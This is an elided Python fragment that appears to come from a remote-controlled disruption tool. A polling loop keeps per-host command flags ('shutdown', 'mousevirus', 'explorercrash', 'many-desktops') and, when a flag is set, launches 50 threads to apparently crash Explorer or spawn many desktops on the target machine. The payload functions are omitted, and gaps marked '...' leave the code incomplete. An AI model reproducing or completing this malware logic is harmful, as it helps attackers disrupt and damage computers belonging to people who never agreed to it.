...
while True:
    ...
    if type(res) == str:
        ...
        if not host in rescomps:
            rescomps[host] = {"shutdown": 0, "mousevirus": 0, "explorercrash": 0, "many-desktops": 0}
        ...
        if not "many-desktops" in rescomps[host].keys():
            rescomps[host]["many-desktops"] = 0
        ...
        if rescomps[host]["explorercrash"] == 1:
            for nthreadcnt in range(50):
                ...
                ethreadlst.append(newthread)
            for thread in ethreadlst:
                thread.start()
            for thread in ethreadlst:
                thread.join()
        if rescomps[host]["many-desktops"] == 1:
            for nthreadcnt in range(50):
                newthread = threading.Thread(target=desktop)
                newthread.daemon = True
                dthreadlst.append(newthread)
            for thread in dthreadlst:
                thread.start()
            for thread in dthreadlst:
                thread.join()
    else:
